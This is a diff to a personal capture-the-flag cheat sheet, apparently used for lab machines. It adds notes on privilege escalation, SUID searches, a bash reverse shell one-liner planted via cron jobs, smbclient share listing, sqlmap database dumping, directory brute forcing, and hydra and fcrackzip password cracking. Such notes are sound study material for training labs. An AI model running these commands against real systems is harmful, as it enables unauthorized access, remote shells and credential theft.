@@ -1,10 +1,20 @@
 *************************** COMMANDS **************************
 
+--> If commands not working check the path using echo $PATH, and set it as export PATH=/bin
+--> The ftp can also have cronjobs so check if there are any scripts that can be used.
+
 ***For Prev Esc***
 --> Try sudo -l
 --> scp linpeas.sh
+--> look for cron jobs and then set up reverse shell if possible
+     by bash -i >& /dev/tcp/'my-own-ip'/4444 0>&1
+--> Look for files with SUID by
+     find / -type f -user root -perm /4000
 
-
+***For OHSINT***
+--> Yandex, Bing or Google
+--> Google maps for geographic description
+--> Lots of research	
 
 1. FTP: 
 
@@ -47,6 +57,9 @@ without the password so to get access to those we can use -->
 smbclient //10.10.18.111/share_name
 password requirement is prompted: enter password or press return
 
+if share_name is not known we can list the shares as -->
+smbclient -L \\"hostname" -I 10.10.18.111
+
 5. SQLMap:
 
 Using burpsuite with sqlmap, tamper is used to break free through the fire wall and sanata.request is saved from Burp -->
@@ -54,11 +67,12 @@ sqlmap -r santa.request --tamper=space2comment --dbms sqlite --dump-all
 
 In general we can use -->
 sqlmap -u http://10.10.18.111 -a
+sqlmap -u http://10.10.18.111/administrator.php --forms --dump
 
 6. Gobuster:
 
 We can use gobuster in the dir mode as -->
-gobuster dir -u http://10.10.18.111/ -w ~/CTF\ Tools/SecLists/Discovery/Web-Content/common.txt
+gobuster dir -u http://10.10.18.111/ -w ~/CTF\ Tools/SecLists/Discovery/Web-Content/common.txt -x "php,txt,html"
 
 7. Good Shell on the remote server -->
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -102,5 +116,9 @@ sudo /opt/JohnTheRipper/run/john hash.txt --format=gost --wordlist=crack.txt --s
 
 To brute force the ssh login -->
 hydra -l users -P passwd.txt 10.10.18.111 -t 4 ssh
+hydra -l users -P passwd.txt 10.10.18.111 -t 4 ftp
 
-15. 
+15. fcrackzip -->
+fcrackzip -u -D -p ~/CTF\ Tools/rockyou.txt name.zip
+
+16. Some common signatures -->
